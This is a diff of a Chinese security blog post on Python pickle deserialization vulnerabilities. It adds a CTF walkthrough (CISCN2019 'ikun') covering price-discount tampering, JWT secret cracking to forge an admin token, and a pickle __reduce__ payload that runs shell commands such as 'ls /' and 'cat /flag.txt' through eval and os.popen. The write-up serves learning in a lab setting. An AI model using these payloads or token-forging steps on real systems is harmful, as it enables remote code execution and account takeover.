@@ -7,7 +7,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://xrzmblog.cn/img/avatar.png">
 <meta property="article:published_time" content="2024-08-28T06:01:20.000Z">
-<meta property="article:modified_time" content="2024-09-15T08:18:20.331Z">
+<meta property="article:modified_time" content="2024-09-19T09:14:13.470Z">
 <meta property="article:author" content="仙人掌门">
 <meta property="article:tag" content="web攻防">
 <meta property="article:tag" content="web漏洞">
@@ -64,7 +64,7 @@
   isHome: false,
   isHighlightShrink: false,
   isToc: true,
-  postUpdate: '2024-09-15 16:18:20'
+  postUpdate: '2024-09-19 17:14:13'
 }</script><script>(win=>{
       win.saveToLocal = {
         set: (key, value, ttl) => {
@@ -161,7 +161,7 @@
         }
       }
       detectApple()
-    })(window)</script><link rel="stylesheet" href="/css/custom.css"><meta name="generator" content="Hexo 7.1.1"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">33</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">16</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">7</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://xrzm-img.oss-cn-guangzhou.aliyuncs.com/xrzmblog-img/202407151616081.png')"><nav id="nav"><span id="blog-info"><a href="/" title="Zm's Blog"><img class="site-icon" src="https://xrzm-img.oss-cn-guangzhou.aliyuncs.com/xrzmblog-img/202407181554497.png"/><span class="site-name">Zm's Blog</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Pickle反序列化漏洞详解</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-08-28T06:01:20.000Z" title="发表于 2024-08-28 14:01:20">2024-08-28</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-09-15T08:18:20.331Z" title="更新于 2024-09-15 16:18:20">2024-09-15</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/web/">web</a></span></div><div class="meta-secondline"></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="反序列化概念"><a href="#反序列化概念" class="headerlink" title="反序列化概念"></a>反序列化概念</h1><p><strong>序列化</strong>：将Python对象转换为字节流的过程。这个过程可以通过<code>pickle.dump()</code>或<code>pickle.dumps()</code>函数实现（两者的区别是<strong>写不写入文件</strong>）。</p>
+    })(window)</script><link rel="stylesheet" href="/css/custom.css"><meta name="generator" content="Hexo 7.1.1"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">33</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">16</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">7</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://xrzm-img.oss-cn-guangzhou.aliyuncs.com/xrzmblog-img/202407151616081.png')"><nav id="nav"><span id="blog-info"><a href="/" title="Zm's Blog"><img class="site-icon" src="https://xrzm-img.oss-cn-guangzhou.aliyuncs.com/xrzmblog-img/202407181554497.png"/><span class="site-name">Zm's Blog</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Pickle反序列化漏洞详解</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-08-28T06:01:20.000Z" title="发表于 2024-08-28 14:01:20">2024-08-28</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-09-19T09:14:13.470Z" title="更新于 2024-09-19 17:14:13">2024-09-19</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/web/">web</a></span></div><div class="meta-secondline"></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="反序列化概念"><a href="#反序列化概念" class="headerlink" title="反序列化概念"></a>反序列化概念</h1><p><strong>序列化</strong>：将Python对象转换为字节流的过程。这个过程可以通过<code>pickle.dump()</code>或<code>pickle.dumps()</code>函数实现（两者的区别是<strong>写不写入文件</strong>）。</p>
 <ul>
 <li><code>pickle.dump(obj, file)</code>：将对象<code>obj</code>序列化并写入文件<code>file</code>。</li>
 <li><code>pickle.dumps(obj)</code>：将对象<code>obj</code>序列化为<strong>字节流</strong>并返回。</li>
@@ -879,11 +879,49 @@
 
 
 
-<h1 id="CTF实战"><a href="#CTF实战" class="headerlink" title="CTF实战"></a>CTF实战</h1><h2 id="CISCN2019-华北赛区-Day1-Web2-ikun"><a href="#CISCN2019-华北赛区-Day1-Web2-ikun" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web2]ikun"></a>[CISCN2019 华北赛区 Day1 Web2]ikun</h2><br>
+<h1 id="CTF实战"><a href="#CTF实战" class="headerlink" title="CTF实战"></a>CTF实战</h1><h2 id="CISCN2019-华北赛区-Day1-Web2-ikun"><a href="#CISCN2019-华北赛区-Day1-Web2-ikun" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web2]ikun"></a>[CISCN2019 华北赛区 Day1 Web2]ikun</h2><p>1、打开题目看到这样一个界面，看起来是要购买lv6等级的一个账号</p>
+<p><img src="https://xrzm-img.oss-cn-guangzhou.aliyuncs.com/xrzmblog-img/202409171511345.png" alt="image-20240917151145201"></p>
+<p>2、那我们先要找到lv6等级账号的所在，翻了几页发现找不到，查看源代码说是有hint，但是hint在哪里也不知道，但是代码中可以看到等级的标签，我们可以通过脚本遍历页数进行查找lv6</p>
+<p><img src="https://xrzm-img.oss-cn-guangzhou.aliyuncs.com/xrzmblog-img/202409171610359.png" alt="image-20240917161023231"></p>
+<p>3、通过脚本可以发现lv6在181页中</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://0dab36d7-a17d-4353-b7ab-95302e67bd31.node5.buuoj.cn:81/shop&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">    result=requests.get(url,params=&#123;<span class="string">&quot;page&quot;</span>:i&#125;)</span><br><span class="line">    <span class="keyword">if</span>(result.text.find(<span class="string">&quot;lv6.png&quot;</span>)!=-<span class="number">1</span>):</span><br><span class="line">        <span class="built_in">print</span>(result.text)</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://xrzm-img.oss-cn-guangzhou.aliyuncs.com/xrzmblog-img/202409171622641.png" alt="image-20240917162212560"></p>
+<p>4、注册登录发现账户上只有10块钱，购买不了lv6的账户，bp抓包发现我们可以修改价格和折扣，尝试修改价格发现是不行的，修改折扣为<code>0.000000001</code>后回显了<code>/b1g_m4mber</code></p>
+<p><img src="https://xrzm-img.oss-cn-guangzhou.aliyuncs.com/xrzmblog-img/202409171627575.png" alt="image-20240917162756496"></p>
+<p>5、进入页面被告知只允许admin访问</p>
+<p><img src="https://xrzm-img.oss-cn-guangzhou.aliyuncs.com/xrzmblog-img/202409171631414.png" alt="image-20240917163157348"></p>
+<p>6、再次抓包发现有一串JWT，经过尝试，简单的修改username为admin是没有作用的，那我们将这串JWT放到<code>c-jwt-cracker</code>工具内跑出密钥，得到secret&#x3D;1Kun</p>
+<p><img src="https://xrzm-img.oss-cn-guangzhou.aliyuncs.com/xrzmblog-img/202409171633063.png" alt="image-20240917163315992"></p>
+<p><img src="https://xrzm-img.oss-cn-guangzhou.aliyuncs.com/xrzmblog-img/202409171639356.png" alt="image-20240917163935303"></p>
+<p>7、将username改为admin的同时，将1Kun写入secret，得到一串伪造admin的JWT，传入得到以下页面</p>
+<p><img src="https://xrzm-img.oss-cn-guangzhou.aliyuncs.com/xrzmblog-img/202409171643502.png" alt="image-20240917164315409"></p>
+<p>8、点击“一键成为大会员”并没有什么用，查看源代码，发现有一个压缩包，应该是一开始看到的所谓的hint吧</p>
+<p><img src="https://xrzm-img.oss-cn-guangzhou.aliyuncs.com/xrzmblog-img/202409171647675.png" alt="image-20240917164710598"></p>
+<p>9、在<code>\www\sshop\views</code>路径下的Admin.py中,发现这里对become参数进行pickle了反序列化</p>
+<blockquote>
+<p>become参数在&#x2F;b1g_m4mber中被hide了</p>
+</blockquote>
+<p><img src="https://xrzm-img.oss-cn-guangzhou.aliyuncs.com/xrzmblog-img/202409171651269.png" alt="image-20240917165137188"></p>
+<p>10、我们构造脚本如下：</p>
+<blockquote>
+<p><code>urllib.quote</code> 是 Python 2 的函数，在 Python 3 中已经被移除，可知这题的环境是python2，那么我们也需要使用python2去运行脚本</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">payload</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>,(<span class="string">&quot;(__import__(&#x27;os&#x27;).popen(&#x27;ls /&#x27;).read())&quot;</span>,))</span><br><span class="line"></span><br><span class="line">payload = pickle.dumps(payload())</span><br><span class="line">payload = urllib.quote(payload)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#c__builtin__%0Aeval%0Ap0%0A%28S%22%28__import__%28%27os%27%29.popen%28%27ls%20/%27%29.read%28%29%29%22%0Ap1%0Atp2%0ARp3%0A.</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://xrzm-img.oss-cn-guangzhou.aliyuncs.com/xrzmblog-img/202409171739034.png" alt="image-20240917173939961"></p>
+<p>11、把payload赋值到become，提交数据包得到flag.txt在根目录下，接下来只需要将<code>ls /</code>改成cat <code>/flag.txt</code>即可</p>
+<blockquote>
+<p>注意：这里需要把伪造的JWT也传入</p>
+</blockquote>
+<p><img src="https://xrzm-img.oss-cn-guangzhou.aliyuncs.com/xrzmblog-img/202409171736378.png" alt="image-20240917173635257"></p>
+<p><img src="https://xrzm-img.oss-cn-guangzhou.aliyuncs.com/xrzmblog-img/202409171743583.png" alt="image-20240917174335502"></p>
+<br>
 
 
 
-<h2 id="Code-Breaking-picklecode"><a href="#Code-Breaking-picklecode" class="headerlink" title="Code Breaking picklecode"></a>Code Breaking picklecode</h2><br>
+<h2 id="Code-Breaking-picklecode"><a href="#Code-Breaking-picklecode" class="headerlink" title="Code Breaking picklecode"></a>Code Breaking picklecode</h2><p>1、</p>
+<br>
 
 
 
